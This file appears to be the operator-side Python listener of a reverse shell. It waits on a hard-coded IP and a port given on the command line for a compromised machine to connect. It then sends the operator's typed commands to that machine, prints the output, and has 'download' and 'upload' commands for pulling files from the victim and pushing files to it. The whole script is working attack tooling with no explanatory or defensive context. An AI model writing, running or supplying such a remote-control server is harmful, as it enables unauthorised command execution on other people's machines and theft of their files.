from socket import *
import sys


s=socket()
s.bind(('192.168.12.128',int(sys.argv[1])))
s.listen(5)
print("[+] Listening for incomming connection")
print("[+]Shell is running ...")
target,addr=s.accept()
while True:
    print("connection accepted from %s" %str(addr))
    command=input("Shell from %s > " %str(addr))
    target.send(command.encode())
    if command == "q":
        print("exiting...")
        #target.send(command.encode())
        target.close()
        break

 

    elif command[:8] == "download":
        #print("here")
        with open(command[9:].strip(),"wb") as file:
            file_data=target.recv(1024)
            #print(file_data.decode())
            file.write(file_data)
            
    elif command[:6] == "upload":
        try:
            with open(command[6:].strip(),"rb") as fin:
                target.send(fin.read())
        except:
            failed="failed to upload".encode()
            target.send(failed)
                
    else:
        #target.send(command.encode())
        result=target.recv(1024)
        print(result.decode())

 

s.close()
